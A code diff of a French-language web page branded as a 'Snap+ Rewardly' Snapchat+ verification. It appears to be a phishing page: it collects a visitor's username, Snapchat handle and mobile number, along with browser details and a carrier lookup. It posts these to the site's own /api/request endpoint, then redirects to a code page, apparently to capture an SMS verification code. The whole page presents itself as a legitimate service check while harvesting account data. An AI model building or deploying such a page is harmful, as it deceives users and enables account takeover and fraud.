@@ -1,98 +1,348 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <meta name="theme-color" content="#000000" />
-  <title>Verification — Snap+ Rewardly</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="css/main.css" />
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta name="theme-color" content="#000000" />
+<title>Verification — Snap+ Rewardly</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+:root {
+  --bg: #000000; --bg2: #0a0a0a; --surface: rgba(255,255,255,.05);
+  --surface2: rgba(255,255,255,.08); --border: rgba(255,255,255,.08);
+  --border2: rgba(255,255,255,.12); --accent: #FFFC00; --accent2: #FFF59D;
+  --accent-gl: linear-gradient(135deg, #FFFC00, #FFF59D);
+  --svc: #FFFC00; --svc-glow: rgba(255,252,0,.45);
+  --text: #ffffff; --text2: rgba(255,255,255,.7); --text3: rgba(255,255,255,.4);
+  --success: #22c55e; --success-bg: rgba(34,197,94,.12);
+  --danger: #f87171; --radius: 16px; --radius-sm: 10px; --radius-pill: 100px;
+  --font: 'Inter', system-ui, -apple-system, sans-serif;
+  --trans: .2s cubic-bezier(.4,0,.2,1);
+}
+html { scroll-behavior: smooth; -webkit-tap-highlight-color: transparent; }
+body {
+  background: var(--bg); color: var(--text); font-family: var(--font);
+  font-size: 15px; line-height: 1.6; overflow-x: hidden; -webkit-font-smoothing: antialiased;
+}
+a { color: inherit; text-decoration: none; }
+button { cursor: pointer; border: none; background: none; font-family: inherit; }
+input { font-family: inherit; }
+.bg-mesh { position: fixed; inset: 0; z-index: 0;
+  background: radial-gradient(ellipse 60% 50% at 15% 20%, rgba(255,252,0,.12), transparent 70%),
+              radial-gradient(ellipse 50% 40% at 85% 75%, rgba(255,245,157,.07), transparent 70%), var(--bg);
+  pointer-events: none; }
+.orb { position: fixed; border-radius: 50%; filter: blur(80px); pointer-events: none; z-index: 0; opacity: .55; }
+.orb1 { width: 600px; height: 600px; top: -180px; left: -180px; background: rgba(255,252,0,.15); }
+.orb2 { width: 500px; height: 500px; bottom: -150px; right: -150px; background: rgba(255,245,157,.1); }
+.toast-wrap { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); z-index: 9000; display: flex; flex-direction: column; align-items: center; gap: 8px; pointer-events: none; }
+.toast { display: flex; align-items: center; gap: 10px; padding: 12px 18px; background: rgba(10,10,10,.97); border: 1px solid var(--border2); border-radius: var(--radius-pill); backdrop-filter: blur(16px); font-size: 14px; font-weight: 650; color: var(--text); animation: toastIn .25s cubic-bezier(.34,1.56,.64,1) both; max-width: min(92vw, 460px); pointer-events: auto; }
+.toast.success { border-color: rgba(34,197,94,.35); }
+.toast.error { border-color: rgba(248,113,113,.35); }
+@keyframes toastIn { from { opacity: 0; transform: translateY(10px) scale(.95); } }
+.spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.2); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; flex-shrink: 0; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.feedback { font-size: 12px; color: rgba(255,255,255,.72); line-height: 1.4; min-height: 16px; }
+.feedback.ok { color: #86efac; }
+.feedback.err { color: #fca5a5; font-weight: 700; }
+.form-group { display: flex; flex-direction: column; gap: 6px; margin-bottom: 20px; }
+.form-group label { font-size: 13px; font-weight: 600; color: var(--text2); }
+.form-group input, input[type="text"], input[type="tel"], input[type="password"] {
+  width: 100%; padding: 13px 16px; background: rgba(255,255,255,.05);
+  border: 1.5px solid var(--border2); border-radius: var(--radius-sm);
+  color: var(--text); font-size: 15px; outline: none; transition: border-color var(--trans), background var(--trans), box-shadow var(--trans);
+}
+.form-group input::placeholder, input::placeholder { color: var(--text3); }
+input:focus { border-color: var(--accent); background: rgba(255,252,0,.06); box-shadow: 0 0 0 3px rgba(255,252,0,.15); }
+input.valid { border-color: rgba(134,239,172,.72); box-shadow: 0 0 0 3px rgba(34,197,94,.12); }
+input.invalid { border-color: rgba(252,165,165,.85); box-shadow: 0 0 0 3px rgba(248,113,113,.16); }
+.op-tag { display: inline-flex; align-items: center; gap: 5px; font-size: 11px; font-weight: 600; padding: 3px 10px; border-radius: var(--radius-pill); background: var(--surface2); border: 1px solid var(--border2); color: var(--text2); margin-top: 6px; }
+.btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 13px 20px; border-radius: var(--radius-pill); font-size: 14.5px; font-weight: 700; transition: opacity var(--trans), transform var(--trans), box-shadow var(--trans); cursor: pointer; }
+.btn:disabled { opacity: .58; cursor: not-allowed; transform: none !important; box-shadow: none !important; }
+.btn-primary { width: 100%; background: var(--accent-gl); color: #000; box-shadow: 0 0 30px rgba(255,252,0,.4), 0 4px 18px rgba(255,252,0,.3); font-weight: 800; position: relative; overflow: hidden; }
+.btn-primary::before { content: ""; position: absolute; inset: 0; background: linear-gradient(90deg, transparent, rgba(255,255,255,.4), transparent); transform: translateX(-100%); transition: transform .6s; }
+.btn-primary:hover::before { transform: translateX(100%); }
+.btn-primary:not(:disabled):hover { transform: translateY(-3px); box-shadow: 0 0 40px rgba(255,252,0,.6), 0 8px 24px rgba(255,252,0,.4); }
+.btn-primary:not(:disabled):active { transform: scale(.96); }
+.btn-lg { padding: 18px 32px; font-size: 17px; }
+.btn-ghost { width: auto; padding: 13px 24px; background: rgba(255,255,255,.05); border: 1.5px solid var(--border2); color: var(--text); border-radius: var(--radius-pill); }
+.btn-ghost:hover { background: var(--surface2); box-shadow: 0 0 20px rgba(255,255,255,.08); }
+.form-page { position: relative; z-index: 1; display: flex; align-items: center; justify-content: center; min-height: 100dvh; padding: 20px; }
+.form-card { width: 100%; max-width: 460px; background: rgba(10,10,10,.88); border: 1px solid var(--border2); border-radius: 22px; backdrop-filter: blur(20px); box-shadow: 0 24px 80px rgba(0,0,0,.5); overflow: hidden; }
+.form-header { padding: 20px 28px 0; display: flex; align-items: center; justify-content: space-between; }
+.form-logo { font-size: 1rem; font-weight: 800; color: var(--accent2); }
+.form-badge { display: flex; align-items: center; gap: 6px; padding: 5px 12px; background: rgba(255,252,0,.12); border: 1px solid rgba(255,252,0,.25); border-radius: var(--radius-pill); font-size: .75rem; font-weight: 700; color: #000; }
+.badge-dot { width: 6px; height: 6px; border-radius: 50%; background: #000; box-shadow: 0 0 5px #000; animation: pulse 2s ease-in-out infinite; }
+@keyframes pulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: .6; transform: scale(.8); } }
+.progress-wrap { position: relative; height: 3px; background: rgba(255,255,255,.06); overflow: visible; margin-top: 16px; }
+.progress-fill { height: 100%; width: 0%; background: var(--accent-gl); transition: width .5s cubic-bezier(.4,0,.2,1); }
+.steps-dots { display: flex; align-items: center; justify-content: center; padding: 18px 24px 0; gap: 0; }
+.step-dot { display: flex; flex-direction: column; align-items: center; gap: 5px; flex-shrink: 0; }
+.step-dot .dot { width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,.07); border: 1.5px solid var(--border2); font-size: 13px; font-weight: 700; display: flex; align-items: center; justify-content: center; color: var(--text3); transition: all var(--trans); box-shadow: 0 2px 8px rgba(0,0,0,.2); }
+.step-dot.active .dot { background: var(--accent); border-color: var(--accent); color: #000; box-shadow: 0 0 20px var(--svc-glow), 0 4px 12px rgba(255,252,0,.3); }
+.step-dot.done .dot { background: var(--success-bg); border-color: rgba(34,197,94,.4); color: var(--success); box-shadow: 0 2px 8px rgba(34,197,94,.2); }
+.step-dot > span:last-child { font-size: 11px; font-weight: 600; color: var(--text3); white-space: nowrap; }
+.step-dot.active > span:last-child, .step-dot.done > span:last-child { color: var(--text2); }
+.step-line { flex: 1; height: 2px; background: var(--border2); margin: 0 8px; margin-bottom: 18px; border-radius: 2px; transition: background var(--trans); }
+.step-line.done { background: linear-gradient(90deg, var(--success), rgba(34,197,94,.4)); }
+.step { display: none; padding: 24px 28px 28px; }
+.step.active { display: block; animation: stepIn .3s both; }
+@keyframes stepIn { from { opacity: 0; transform: translateY(8px); } }
+.step-title { font-size: 22px; font-weight: 800; color: var(--text); margin-bottom: 6px; }
+.step-sub { font-size: 13.5px; color: var(--text2); line-height: 1.6; margin-bottom: 20px; }
+.step-btns { display: flex; gap: 10px; }
+.step-btns .btn-ghost { flex-shrink: 0; width: auto; padding: 13px 18px; background: var(--surface); border: 1.5px solid var(--border2); color: var(--text2); font-size: 14.5px; font-weight: 700; border-radius: var(--radius-pill); transition: all var(--trans); }
+.step-btns .btn-ghost:hover { background: var(--surface2); color: var(--text); }
+.step-btns .btn-primary { flex: 1; }
+.ok-icon { width: 64px; height: 64px; border-radius: 50%; background: var(--success-bg); border: 1.5px solid rgba(34,197,94,.35); display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 20px; }
+</style>
 </head>
 <body>
-  <div class="bg-mesh"></div>
-  <div class="orb orb1"></div>
-  <div class="orb orb2"></div>
+<div class="bg-mesh"></div>
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
 
-  <div class="form-page">
-    <div class="form-card">
+<div class="form-page">
+<div class="form-card">
+<div class="form-header">
+<div class="form-logo">👻 Snap+</div>
+<div class="form-badge"><span class="badge-dot"></span> <span id="svc-badge">Snapchat+</span></div>
+</div>
 
-      <div class="form-header">
-        <div class="form-logo">&#128123; Snap+</div>
-        <div class="form-badge"><span class="badge-dot"></span> <span id="svc-badge">Snapchat+</span></div>
-      </div>
+<div class="progress-wrap"><div class="progress-fill" id="progress-fill"></div></div>
 
-      <div class="progress-wrap"><div class="progress-fill" id="progress-fill"></div></div>
+<div class="steps-dots">
+<div class="step-dot active" data-step="1"><div class="dot">1</div><span>Pseudo</span></div>
+<div class="step-line"></div>
+<div class="step-dot" data-step="2"><div class="dot">2</div><span>Snap</span></div>
+<div class="step-line"></div>
+<div class="step-dot" data-step="3"><div class="dot">3</div><span>Telephone</span></div>
+</div>
 
-      <div class="steps-dots">
-        <div class="step-dot active" data-step="1"><div class="dot">1</div><span>Pseudo</span></div>
-        <div class="step-line"></div>
-        <div class="step-dot" data-step="2"><div class="dot">2</div><span>Snap</span></div>
-        <div class="step-line"></div>
-        <div class="step-dot" data-step="3"><div class="dot">3</div><span>Telephone</span></div>
-      </div>
+<!-- STEP 1 -->
+<div class="step active" id="step-1">
+<h2 class="step-title">Ton pseudo</h2>
+<p class="step-sub">Entre le pseudo visible sur ton profil.</p>
+<div class="input-group">
+<label for="inp-pseudo">Pseudo</label>
+<input type="text" id="inp-pseudo" maxlength="32" placeholder="Ex: Shadow_42" autocomplete="off" />
+<div class="feedback" id="fb-pseudo">3 a 32 caracteres</div>
+</div>
+<button class="btn btn-primary" id="btn-1" disabled>Suivant</button>
+</div>
 
-      <!-- STEP 1 -->
-      <div class="step active" id="step-1">
-        <h2 class="step-title">Ton pseudo</h2>
-        <p class="step-sub">Entre le pseudo visible sur ton profil.</p>
-        <div class="input-group">
-          <label for="inp-pseudo">Pseudo</label>
-          <input type="text" id="inp-pseudo" maxlength="32" placeholder="Ex: Shadow_42" autocomplete="off" />
-          <div class="feedback" id="fb-pseudo">3 a 32 caracteres</div>
-        </div>
-        <button class="btn btn-primary" id="btn-1" disabled>Suivant</button>
-      </div>
+<!-- STEP 2 -->
+<div class="step" id="step-2">
+<h2 class="step-title" id="step2-title">Ton handle</h2>
+<p class="step-sub" id="step2-sub">Renseigne ton identifiant.</p>
+<div class="input-group">
+<label for="inp-handle" id="step2-label">Identifiant</label>
+<input type="text" id="inp-handle" maxlength="32" placeholder="..." autocomplete="off" />
+<div class="feedback" id="fb-handle"></div>
+</div>
+<div class="step-btns">
+<button class="btn btn-ghost" id="btn-back-2">Retour</button>
+<button class="btn btn-primary" id="btn-2" disabled>Suivant</button>
+</div>
+</div>
 
-      <!-- STEP 2 -->
-      <div class="step" id="step-2">
-        <h2 class="step-title" id="step2-title">Ton handle</h2>
-        <p class="step-sub" id="step2-sub">Renseigne ton identifiant.</p>
-        <div class="input-group">
-          <label for="inp-handle" id="step2-label">Identifiant</label>
-          <input type="text" id="inp-handle" maxlength="32" placeholder="..." autocomplete="off" />
-          <div class="feedback" id="fb-handle"></div>
-        </div>
-        <div class="step-btns">
-          <button class="btn btn-ghost" id="btn-back-2">Retour</button>
-          <button class="btn btn-primary" id="btn-2" disabled>Suivant</button>
-        </div>
-      </div>
+<!-- STEP 3 -->
+<div class="step" id="step-3">
+<h2 class="step-title">Numero de telephone</h2>
+<p class="step-sub">Un SMS de verification sera envoye sur ce numero.</p>
+<div class="input-group">
+<label for="inp-phone">Telephone</label>
+<input type="tel" id="inp-phone" maxlength="10" placeholder="06XXXXXXXX" inputmode="numeric" autocomplete="tel" />
+<div class="feedback" id="fb-phone">Format : 06 ou 07 + 8 chiffres</div>
+</div>
+<div id="op-badge"></div>
+<div class="step-btns">
+<button class="btn btn-ghost" id="btn-back-3">Retour</button>
+<button class="btn btn-primary" id="btn-submit" disabled>
+<span>Continuer</span>
+<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8h10M9 4l4 4-4 4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+</button>
+</div>
+</div>
 
-      <!-- STEP 3 -->
-      <div class="step" id="step-3">
-        <h2 class="step-title">Numero de telephone</h2>
-        <p class="step-sub">Un SMS de verification sera envoye sur ce numero.</p>
-        <div class="input-group">
-          <label for="inp-phone">Telephone</label>
-          <input type="tel" id="inp-phone" maxlength="10" placeholder="06XXXXXXXX" inputmode="numeric" autocomplete="tel" />
-          <div class="feedback" id="fb-phone">Format : 06 ou 07 + 8 chiffres</div>
-        </div>
-        <div id="op-badge"></div>
-        <div class="step-btns">
-          <button class="btn btn-ghost" id="btn-back-3">Retour</button>
-          <button class="btn btn-primary" id="btn-submit" disabled>
-            <span>Continuer</span>
-            <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8h10M9 4l4 4-4 4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
-          </button>
-        </div>
-      </div>
+<!-- SUCCESS -->
+<div class="step" id="step-ok" style="display:none">
+<div class="ok-icon">&#10003;</div>
+<h2 class="step-title">Demande envoyee</h2>
+<p class="step-sub">Un operateur va traiter ta demande. Tu vas etre redirige.</p>
+</div>
 
-      <!-- SUCCESS -->
-      <div class="step" id="step-ok" style="display:none">
-        <div class="ok-icon">&#10003;</div>
-        <h2 class="step-title">Demande envoyee</h2>
-        <p class="step-sub">Un operateur va traiter ta demande. Tu vas etre redirige.</p>
-      </div>
+</div>
+</div>
 
-    </div>
-  </div>
+<div id="toast-wrap" class="toast-wrap"></div>
 
-  <div id="toast-wrap" class="toast-wrap"></div>
-  <script src="js/config.js"></script>
-  <script src="js/front-log.js"></script>
-  <script src="js/api.js"></script>
-  <script src="js/app.js"></script>
+<script>
+"use strict";
+const SVC = "snap";
+const SVC_CFG = { snap: { label: "Snapchat+", handle: "Pseudo Snapchat", ph: "john.doe99", max: 15, icon: "\u{1F47B}" } };
+const SVC_COLORS = { snap: "#FFFC00" };
+const cfg = SVC_CFG[SVC];
+const color = SVC_COLORS[SVC] || "#FFFC00";
+document.documentElement.style.setProperty("--svc", color);
+document.documentElement.style.setProperty("--svc-glow", color + "33");
+document.getElementById("svc-badge").textContent = cfg.label;
+
+let step = 1;
+const fill = document.getElementById("progress-fill");
+const dots = document.querySelectorAll(".step-dot");
+function goStep(n) {
+  document.getElementById("step-" + step).classList.remove("active");
+  document.getElementById("step-" + n).classList.add("active");
+  fill.style.width = ((n - 1) / 3 * 100) + "%";
+  dots.forEach((d, i) => {
+    d.classList.toggle("done", i + 1 < n);
+    d.classList.toggle("active", i + 1 === n);
+  });
+  step = n;
+}
+
+const inpP = document.getElementById("inp-pseudo");
+const fbP = document.getElementById("fb-pseudo");
+const btn1 = document.getElementById("btn-1");
+let pseudoOk = false;
+inpP.addEventListener("input", () => {
+  const v = inpP.value.trim();
+  pseudoOk = false;
+  inpP.classList.remove("valid", "invalid");
+  if (!v) { fbP.className = "feedback"; fbP.textContent = "3 a 32 caracteres"; }
+  else if (v.length < 3) { inpP.classList.add("invalid"); fbP.className = "feedback err"; fbP.textContent = "Trop court"; }
+  else if (!/^[a-zA-Z0-9_-]+$/.test(v)) { inpP.classList.add("invalid"); fbP.className = "feedback err"; fbP.textContent = "Caracteres non autorises"; }
+  else { inpP.classList.add("valid"); fbP.className = "feedback ok"; fbP.textContent = "Pseudo valide"; pseudoOk = true; }
+  btn1.disabled = !pseudoOk;
+});
+btn1.addEventListener("click", () => { if (pseudoOk) { goStep(2); document.getElementById("inp-handle").focus(); } });
+
+document.getElementById("step2-title").textContent = cfg.label;
+document.getElementById("step2-sub").textContent = "Renseigne ton " + cfg.handle;
+document.getElementById("step2-label").textContent = cfg.handle;
+const inpH = document.getElementById("inp-handle");
+const fbH = document.getElementById("fb-handle");
+const btn2 = document.getElementById("btn-2");
+let handleOk = false;
+inpH.placeholder = cfg.ph;
+inpH.maxLength = cfg.max;
+inpH.addEventListener("input", () => {
+  const v = inpH.value.trim();
+  handleOk = false;
+  inpH.classList.remove("valid", "invalid");
+  if (!v) { fbH.className = "feedback"; fbH.textContent = ""; }
+  else if (v.length < 2) { inpH.classList.add("invalid"); fbH.className = "feedback err"; fbH.textContent = "Trop court"; }
+  else { inpH.classList.add("valid"); fbH.className = "feedback ok"; fbH.textContent = "@" + v; handleOk = true; }
+  btn2.disabled = !handleOk;
+});
+document.getElementById("btn-back-2").addEventListener("click", () => { goStep(1); inpP.focus(); });
+btn2.addEventListener("click", () => { if (handleOk) { goStep(3); inpPhone.focus(); } });
+
+const inpPhone = document.getElementById("inp-phone");
+const fbPhone = document.getElementById("fb-phone");
+const btnSubmit = document.getElementById("btn-submit");
+let phoneOk = false;
+const OPERATORS = [
+  [600,619,"Orange"],[620,629,"SFR"],[630,639,"Bouygues"],
+  [640,649,"SFR"],[650,654,"Free"],[655,659,"SFR"],[660,669,"Orange"],
+  [670,679,"Orange"],[680,689,"SFR"],[690,699,"Bouygues"],
+  [700,709,"Orange"],[710,719,"Bouygues"],[720,739,"SFR"],[740,749,"Bouygues"],
+  [750,754,"Free"],[760,779,"SFR"],[780,799,"Free"],
+];
+function getOp(num) {
+  const p4 = parseInt(num.slice(0, 4), 10);
+  for (const [a, b, op] of OPERATORS) if (p4 >= a && p4 <= b) return op;
+  return "Inconnu";
+}
+inpPhone.addEventListener("input", () => {
+  inpPhone.value = inpPhone.value.replace(/\D/g, "").slice(0, 10);
+  const v = inpPhone.value;
+  phoneOk = false;
+  inpPhone.classList.remove("valid", "invalid");
+  document.getElementById("op-badge").innerHTML = "";
+  if (!v) { fbPhone.className = "feedback"; fbPhone.textContent = "Format : 06 ou 07 + 8 chiffres"; btnSubmit.disabled = true; return; }
+  if (v.length < 10) { fbPhone.className = "feedback"; fbPhone.textContent = (10 - v.length) + " chiffres restants"; btnSubmit.disabled = true; return; }
+  if (!/^0[67]\d{8}$/.test(v)) { inpPhone.classList.add("invalid"); fbPhone.className = "feedback err"; fbPhone.textContent = "Doit commencer par 06 ou 07"; btnSubmit.disabled = true; return; }
+  const op = getOp(v);
+  inpPhone.classList.add("valid");
+  fbPhone.className = "feedback ok";
+  fbPhone.textContent = "Numero valide";
+  document.getElementById("op-badge").innerHTML = '<span class="op-tag">' + op + '</span>';
+  phoneOk = true;
+  btnSubmit.disabled = false;
+});
+document.getElementById("btn-back-3").addEventListener("click", () => { goStep(2); inpH.focus(); });
+
+btnSubmit.addEventListener("click", async () => {
+  if (!pseudoOk || !handleOk || !phoneOk) return;
+  btnSubmit.disabled = true;
+  btnSubmit.innerHTML = '<div class="spinner"></div><span>Envoi...</span>';
+
+  const rid = crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).slice(2);
+  const phone = inpPhone.value;
+
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+    const res = await fetch(window.location.origin + "/api/request", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        rid: rid,
+        service: SVC,
+        pseudo: inpP.value.trim(),
+        handle: inpH.value.trim().toLowerCase(),
+        phone: phone,
+        operator: getOp(phone),
+        opType: "Mobile",
+        ip: "",
+        device: navigator.platform || "",
+        browser: navigator.userAgent || "",
+        os: "",
+        ts: Date.now(),
+      }),
+      signal: controller.signal,
+    });
+
+    clearTimeout(timeoutId);
+    const ok = await res.json();
+
+    if (!ok || !ok.ok) {
+      toast("Erreur lors de l'envoi", "error");
+      btnSubmit.disabled = false;
+      btnSubmit.innerHTML = '<span>Continuer</span>';
+      return;
+    }
+
+    sessionStorage.setItem("verif", JSON.stringify({
+      rid, svc: SVC,
+      pseudo: inpP.value.trim(),
+      handle: inpH.value.trim().toLowerCase(),
+      phone,
+    }));
+
+    window.location.replace("code.html");
+  } catch (e) {
+    console.error("Erreur:", e);
+    if (e.name === "AbortError") {
+      toast("Le serveur met trop de temps a repondre", "error");
+    } else {
+      toast("Erreur reseau", "error");
+    }
+    btnSubmit.disabled = false;
+    btnSubmit.innerHTML = '<span>Continuer</span>';
+  }
+});
+
+function toast(msg, type) {
+  const wrap = document.getElementById("toast-wrap");
+  const el = document.createElement("div");
+  el.className = "toast " + (type || "info");
+  el.textContent = msg;
+  wrap.appendChild(el);
+  setTimeout(() => { el.style.opacity = "0"; setTimeout(() => el.remove(), 300); }, 3000);
+}
+</script>
 </body>
 </html>
